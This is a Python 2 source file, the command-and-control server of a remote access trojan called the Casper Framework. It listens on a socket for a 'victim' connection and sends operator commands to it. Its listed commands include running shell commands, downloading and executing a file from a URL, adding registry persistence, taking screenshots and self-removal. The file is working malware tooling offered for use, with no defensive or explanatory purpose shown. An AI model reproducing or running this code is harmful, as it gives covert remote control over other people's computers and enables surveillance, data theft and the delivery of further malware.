'''
Part of Casper Framework
'''
from framework.includes import *

host = "127.0.0.1"
port = 4445    

def socket_create():
	global socket_server

	try:
		socket_server = socket.socket()
		print "[casper server] socket successfully created"
		return True
	except Exception as e:
		print "[casper server] unable to create socket >> {}".format(e)
		return False

def socket_bind():
	try:
		socket_server.bind((host,port))        
		print "[casper server] socket binded to %s" %(port)
		return True
	except Exception as e:
		print "[casper server] unable to bind >> {}".format(e)
		return False

def socket_listen():
	try:
		socket_server.listen(1)
		print "[casper server] listning for incoming connections..."
		return True
	except Exception as e:
		print "[casper server] unable to listen for incoming connections >> {}".format(e)
		return False

if __name__ == '__main__':		
	print '''
 >>
 >> CASPER (c) rootm0s 
 >>
	 
 Available commands:
    * shell cmd        <sends shell command>
    * downexec url     <download and execute via shell>
    * infect           <adds itself to startup via registry>
    * screenshot       <takes screenshot>
    * removal          <remove myself>
    * quit             <quit server>
'''

	if (socket_create() == True):
		if (socket_bind() == True):
			if (socket_listen() == True):
				while True:
					client, addr = socket_server.accept()
					print "[casper server] victim connected from {}".format(addr)

					while True:
						input = raw_input('\n@~> ')
						client.send(encode(input))
						
						if (input == "screenshot"):
							data = decode(client.recv(11048576))
							try:
								file = open('screenshot.png', 'wb')
								file.write(data)
								file.close()
							except Exception as e:
								print "[casper server] can't write screenshot.png to disk >> {}".format(e)

							data = decode(client.recv(11048576))
							print data	
						elif (input == "quit"):
							sys.exit()
						else:
							data = decode(client.recv(11048576))
							print data
